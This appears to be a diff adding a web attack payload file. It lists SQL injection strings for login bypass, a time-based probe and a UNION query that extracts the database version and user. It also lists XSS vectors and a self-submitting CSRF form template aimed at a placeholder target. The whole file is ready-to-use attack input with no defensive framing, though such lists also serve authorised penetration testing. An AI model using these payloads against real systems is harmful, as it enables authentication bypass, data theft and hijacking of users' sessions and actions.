@@ -1,0 +1,24 @@
+# SQL Injection (auth bypass)
+' OR '1'='1' -- -
+' OR 1=1#
+admin' --
+' OR 'a'='a
+' OR 1=1 LIMIT 1; --
+
+# Time-based SQLi
+' OR SLEEP(5)--
+
+# Union-based SQLi
+' UNION SELECT NULL, version(), user() -- 
+
+# XSS (reflected/stored)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert('xss')</script>
+
+# CSRF (basic HTML form auto-submit template)
+<form action="http://target/publish" method="POST" id="f">
+  <input type="hidden" name="title" value="X" />
+  <input type="hidden" name="body" value="X" />
+</form>
+<script>document.getElementById('f').submit();</script>
